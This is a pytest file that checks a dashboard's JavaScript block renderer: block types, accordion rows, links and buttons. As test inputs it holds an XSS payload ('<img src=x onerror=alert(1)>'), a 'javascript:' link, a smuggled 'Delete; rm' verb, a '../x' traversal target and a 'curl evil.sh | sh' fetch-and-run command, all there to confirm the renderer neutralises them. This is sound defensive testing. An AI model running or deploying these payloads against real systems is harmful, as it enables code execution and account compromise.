import json
import shutil
import subprocess
from pathlib import Path

import pytest

from .conftest import VIEW

WEB = Path(__file__).resolve().parents[1] / "src" / "orch_dashboard" / "web"
HARNESS = Path(__file__).parent / "blocks_harness.js"
node = pytest.mark.skipif(shutil.which("node") is None, reason="node not installed")


def run(tmp_path, view):
    f = tmp_path / "v.json"
    f.write_text(json.dumps(view))
    out = subprocess.run(["node", str(HARNESS), str(WEB / "blocks.js"), str(f)], capture_output=True, text=True, check=True)
    return json.loads(out.stdout)


def walk(n):
    yield n
    for k in n["kids"]:
        yield from walk(k)


def texts(n):
    return " ".join(x["text"] for x in walk(n) if x["text"])


def test_blocks_js_never_builds_html():
    js = (WEB / "blocks.js").read_text()
    for bad in ("innerHTML", "insertAdjacentHTML", "outerHTML", "document.write", "eval(", "style="):
        assert bad not in js, bad


@node
def test_all_six_block_types_render(tmp_path):
    tree = run(tmp_path, json.loads(VIEW.read_text()))
    classes = " ".join(x["cls"] for x in walk(tree))
    for want in ("stats", "stat-value", "strip", "day", "blk-list", "blk-timeline", "blk-table", "chips"):
        assert want in classes, want
    t = texts(tree)
    assert "Weekly report" in t and "Next run" in t and "5 min" in t  # duration 312 s
    assert "Failed" in t  # tone is a word as well as a colour


@node
def test_links_are_ticket_ids_or_https_only(tmp_path):
    v = json.loads(VIEW.read_text())
    v["blocks"][4]["items"][0]["link"] = "javascript:alert(1)"  # the app checked it already; the renderer must not trust it
    v["blocks"][4]["items"].append({"title": "x", "link": "https://example.com/a"})
    tree = run(tmp_path, v)
    hrefs = [x["attrs"]["href"] for x in walk(tree) if "href" in x["attrs"] and x["tag"] == "a"]
    assert hrefs and all(h.startswith(("#ticket/t_", "https://")) for h in hrefs)
    ext = [x for x in walk(tree) if x["tag"] == "a" and x["attrs"].get("href", "").startswith("https://")]
    assert ext and all(x["attrs"]["target"] == "_blank" and x["attrs"]["rel"] == "noopener noreferrer" for x in ext)


@node
def test_text_is_text_not_markup(tmp_path):
    v = {"blocks": [{"type": "list", "title": "T", "items": [{"title": "<img src=x onerror=alert(1)>"}]},
                    {"type": "hologram"}, {"type": "stat", "label": "a", "value": 3}]}
    tree = run(tmp_path, v)
    assert "<img src=x onerror=alert(1)>" in texts(tree)  # shown as words
    assert not any(x["tag"] == "img" for x in walk(tree)) and not any(x["tag"] == "hologram" for x in walk(tree))


@node
def test_calendar_repeat_item_shows_every_and_note(tmp_path):
    v = {"blocks": [{"type": "calendar", "days": [{"date": "2026-11-05", "items": [
        {"time": "15:05", "every": "Every 5 min", "title": "TEST: pick a word", "note": "next 15:05 · 288 runs/day",
         "link": "t_wd5m0001"}]}]}]}
    tree = run(tmp_path, v)
    runs = [x for x in walk(tree) if "run" in x["cls"].split()]
    assert len(runs) == 1 and "repeat" in runs[0]["cls"]
    t = texts(runs[0])
    assert "Every 5 min" in t and "TEST: pick a word" in t and "288 runs/day" in t and "15:05 " not in t[:6]


ACCORDION = {"blocks": [{"type": "list", "title": "Schedules", "items": [
    {"title": "Month-end check", "subtitle": "Every weekday at 08:00",
     "toggle": {"on": True, "label": "Month-end check on or off", "action": {"op": "addon.act", "args": {"verb": "toggle", "target": "t_mec009"}}},
     "detail": [{"label": "Repeats", "value": "Every weekday"}, {"label": "Webhook address", "value": "https://hooks.example.org/w/abc", "copy": True},
                {"label": "Recent", "lines": ["14:08 started a run", "11:30 started a run"]}],
     "tickets": [{"id": "t_mec009", "key": "MEC-0009", "title": "Reconcile bank balance", "status": {"label": "Blocked", "tone": "warn"}}],
     "actions": [{"label": "Run now", "action": {"op": "addon.act", "args": {"verb": "run", "target": "t_mec009"}}},
                 {"label": "Delete", "tone": "bad", "confirm": "Delete this schedule?",
                  "action": {"op": "addon.act", "args": {"verb": "delete", "target": "t_mec009"}}}]}]}]}


@node
def test_accordion_row_has_detail_tickets_switch_and_confirm_buttons(tmp_path):
    tree = run(tmp_path, ACCORDION)
    nodes = list(walk(tree))
    det = [n for n in nodes if n["tag"] == "details"]
    assert len(det) == 1 and det[0]["data"]["key"].startswith("acc-")
    t = texts(tree)
    assert "Repeats" in t and "14:08 started a run" in t and "Reconcile bank balance" in t and "MEC-0009" in t and "Blocked" in t
    sw = [n for n in nodes if n["attrs"].get("role") == "switch"]
    assert len(sw) == 1 and sw[0]["attrs"]["aria-checked"] == "true" and sw[0]["data"] == {
        "addonAct": "true", "verb": "toggle", "target": "t_mec009", "label": "Month-end check on or off"}
    btns = {n["text"]: n["data"] for n in nodes if n["tag"] == "button" and n["data"].get("addonAct")}
    assert btns["Delete"]["confirm"] == "Delete this schedule?" and "confirm" not in btns["Run now"]
    cp = [n for n in nodes if n["data"].get("copy")]
    assert cp and cp[0]["data"]["copy"] == "https://hooks.example.org/w/abc" and cp[0]["text"] == "Copy"
    links = [n["attrs"]["href"] for n in nodes if n["tag"] == "a"]
    assert links == ["#ticket/t_mec009"]


@node
def test_accordion_actions_other_than_the_one_generic_op_are_not_drawn(tmp_path):
    v = json.loads(json.dumps(ACCORDION))
    it = v["blocks"][0]["items"][0]
    it["actions"][0]["action"] = {"op": "run.start", "args": {"verb": "run", "target": "t_mec009"}}
    it["actions"][1]["action"]["args"]["verb"] = "Delete; rm"
    it["toggle"]["action"]["args"]["target"] = "../x"
    tree = run(tmp_path, v)
    nodes = list(walk(tree))
    assert not any(n["data"].get("addonAct") for n in nodes)
    assert not any(n["attrs"].get("role") == "switch" for n in nodes)


@node
def test_accordion_text_is_text(tmp_path):
    v = json.loads(json.dumps(ACCORDION))
    v["blocks"][0]["items"][0]["detail"][0]["value"] = "<img src=x onerror=alert(1)>"
    tree = run(tmp_path, v)
    assert "<img src=x onerror=alert(1)>" in texts(tree) and not any(n["tag"] == "img" for n in walk(tree))


@node
def test_copy_button_only_for_a_shown_value(tmp_path):
    v = json.loads(json.dumps(ACCORDION))
    v["blocks"][0]["items"][0]["detail"] = [{"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}]
    tree = run(tmp_path, v)
    assert not any(n["data"].get("copy") for n in walk(tree)) and "Daily at 9" in texts(tree)
